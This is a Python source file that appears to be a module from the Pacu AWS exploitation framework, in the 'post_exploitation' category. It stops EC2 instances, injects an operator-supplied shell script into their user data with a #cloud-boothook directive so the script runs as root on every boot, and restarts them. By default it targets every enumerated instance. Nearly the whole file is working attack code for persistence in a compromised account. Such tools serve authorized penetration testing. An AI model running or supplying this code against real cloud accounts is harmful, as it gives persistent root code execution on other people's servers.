#!/usr/bin/env python3
import argparse
import base64
from botocore.exceptions import ClientError
import time
import random


module_info = {
    # Name of the module (should be the same as the filename)
    'name': 'add_ec2_startup_sh_script',

    # Name and any other notes about the author
    'author': 'Spencer Gietzen of Rhino Security Labs based on the idea from https://github.com/dagrz/aws_pwn/blob/master/elevation/bouncy_bouncy_cloudy_cloud.py',

    # Category of the module. Make sure the name matches an existing category.
    'category': 'post_exploitation',

    # One liner description of the module functionality. This shows up when a user searches for modules.
    'one_liner': 'Stops and restarts EC2 instances to execute code.',

    # Description about what the module does and how it works
    'description': 'This module will attempt to stop the chosen EC2 instances, store/display the User Data that is already set for each EC2 instance, update it with a shell script (.sh) of your choosing, then start the instances again. The shell script will be executed as root/SYSTEM everytime the specific instances are booted up.',

    # A list of AWS services that the module utilizes during its execution
    'services': ['EC2'],

    # For prerequisite modules, try and see if any existing modules return the data that is required for your module before writing that code yourself, that way, session data can stay separated and modular.
    'prerequisite_modules': ['enum_ec2_instances'],

    # Module arguments to autocomplete when the user hits tab
    'arguments_to_autocomplete': ['--script', '--instance-ids'],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])

parser.add_argument('--script', help='File path of the shell script to add to the EC2 instances')
parser.add_argument('--instance-ids', required=False, default=None, help='One or more (comma separated) EC2 instance IDs and their regions in the format instanceid@region. Defaults to all instances.')


def help():
    return [module_info, parser.format_help()]


def main(args, pacu_main):
    session = pacu_main.get_active_session()

    ###### Don't modify these. They can be removed if you are not using the function.
    args = parser.parse_args(args)
    print = pacu_main.print
    fetch_data = pacu_main.fetch_data
    get_regions = pacu_main.get_regions
    ######

    regions = get_regions('ec2')

    client = pacu_main.get_boto3_client('ec2', random.choice(regions))

    # Check permissions before hammering through each region
    try:
        client.stop_instances(
            DryRun=True,
            InstanceIds=['i-asdasdas']
        )
        client.describe_instance_attribute(  # This isn't necesarilly required, but ideally you don't delete the old user data and you read it then append the script to instead of replace it and mess up something on the instance
            DryRun=True,
            InstanceId='i-adsadsada'
        )
        client.start_instances(
            DryRun=True,
            InstanceIds=['i-asdasdasd']
        )
        client.modify_instance_attribute(
            DryRun=True,
            InstanceId='i-asdasdas'
        )
    except ClientError as error:
        if not str(error).find('UnauthorizedOperation') == -1:
            print('Dry run failed, the current AWS account does not have the necessary permissions to run this module.\nExiting...')
            return

    instances = []
    if args.instance_ids is not None:  # need to update this to include the regions of these IDs
        for instance in args.instance_ids.split(','):
            instances.append({
                'InstanceId': instance.split('@')[0],
                'Region': instance.split('@')[1]
            })
    else:
        print('Targeting all EC2 instances...')
        if fetch_data(['EC2', 'Instances'], 'enum_ec2_instances', '') is False:
            print('Pre-req module not run successfully. Exiting...')
            return
        for instance in session.EC2['Instances']:
            instances.append({
                'InstanceId': instance['InstanceId'],
                'Region': instance['Region']
            })

    for region in regions:
        client = pacu_main.get_boto3_client('ec2', region)

        for instance in instances:
            if instance['Region'] == region:
                result = stop_instance(client, instance['InstanceId'])
                if result:
                    update_userdata(client, instance['InstanceId'], prepare_user_data(client, instance['InstanceId'], args.script))
                    start_instance(client, instance['InstanceId'])
                else:
                    print('Failed to stop instance {}@{}, skipping.'.format(instance['InstanceId'], instance['Region']))

    print('{} completed.\n'.format(module_info['name']))
    return


def stop_instance(client, instance_id):
    print('Stopping instance id {}'.format(instance_id))

    result = False
    try:
        client.stop_instances(
            InstanceIds=[instance_id]
        )
        result = True
    except ClientError as error:
        print(error.response['Error']['Message'])
        return False

    return result


def start_instance(client, instance_id):
    print('Starting instance id {}'.format(instance_id))

    result = False
    try:
        client.start_instances(
            InstanceIds=[instance_id]
        )
        result = True
    except ClientError as error:
        print(error.response['Error']['Message'])

    return result


def prepare_user_data(client, instance_id, script):  # Replace this with a fetch_data of download_ec2_userdata
    response = client.describe_instance_attribute(
        Attribute='userData',
        InstanceId=instance_id
    )
    user_data = ''
    if response['UserData']:
        user_data = base64.b64decode(response['UserData']['Value']).decode("utf-8")
        # Save the current data in case there is something sensitive
        # with open('output/scrapedUserData.txt', 'a+') as scraped_user_data_file:
        #     scraped_user_data_file.write('User data for instance id {}: {}\n'.format(instance_id, user_data))

    with open(script, 'r') as shell_script:
        # Append our script to their old user data to not screw up the instance
        user_data = '#cloud-boothook\n{}\n\n{}'.format(shell_script.read(), user_data)  # the #cloud-boothook directive is what runs the code every single time the EC2 starts. Regular old user data only runs on the first instance launch

    return user_data


def update_userdata(client, instance_id, user_data):
    print('Setting userData for instance id {}'.format(instance_id))

    result = False
    code = 'IncorrectInstanceState'

    while(code == 'IncorrectInstanceState' and not result):
        try:
            client.modify_instance_attribute(
                InstanceId=instance_id,
                UserData={
                    'Value': user_data
                }
            )
            result = True
        except ClientError as error:
            code = error.response['Error']['Code']
            if code != 'IncorrectInstanceState':
                print(error.response['Error']['Message'])
            time.sleep(5)

    return result
